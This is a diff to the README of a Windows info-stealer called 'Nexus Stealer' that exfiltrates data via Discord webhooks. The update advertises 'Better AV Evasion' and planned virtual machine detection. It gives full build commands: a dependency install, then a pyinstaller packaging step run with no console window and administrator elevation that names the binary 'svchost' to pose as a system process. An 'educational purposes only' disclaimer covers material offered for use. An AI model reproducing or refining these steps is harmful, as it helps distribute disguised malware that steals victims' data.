@@ -1,4 +1,4 @@
-# NEXUS STEALER *V1.0.0*
+# NEXUS STEALER *V1.1.0*
 
 **Disclaimer**: This code is provided for **educational purposes only**. I do not endorse or encourage any misuse, illegal activities, or damage caused by this code. By using this script, you agree that **you are solely responsible** for your actions. I bears no liability for any consequences arising from the use of this tool.
 
@@ -9,14 +9,14 @@ The version system is easy to understand, the first number 'V**1**.0.0' is the m
 ---
 
 ## Updates
-**Version :** *V1.0.0*
-
-- Official Public Release
-
-## Following Update
 **Version :** *V1.1.0*
 
 - Better AV Evasion
+
+## Following Update
+**Version :** *V1.2.0*
+
+- Virtual Machine Detection
 
 ---
 
@@ -33,11 +33,11 @@ By 4 **DIFFERENT** discord webhooks
 
 - Install the dependencies :
 ```
-pip install psutil requests pywin32 pyautogui cryptography netifaces
+pip install psutil requests pyautogui cryptography netifaces pywin32
 ```
 - Convert to .exe :
 ```
-pyinstaller --onefile --noconsole --hidden-import psutil --hidden-import requests --hidden-import pywin32 --hidden-import pyautogui --hidden-import cryptography --hidden-import netifaces --hidden-import win32crypt --hidden-import win32gui --hidden-import win32con --hidden-import win32process --hidden-import win32security --hidden-import win32api --hidden-import win32file --uac-admin --name svchost NexusStealer.py
+pyinstaller --onefile --noconsole --hidden-import psutil --hidden-import requests --hidden-import pyautogui --hidden-import cryptography --hidden-import netifaces --hidden-import win32crypt --hidden-import win32gui --hidden-import win32con --hidden-import win32process --hidden-import win32security --hidden-import win32api --hidden-import win32file --uac-admin --name svchost --icon=NONE NexusStealer.py
 ```
 
 ---
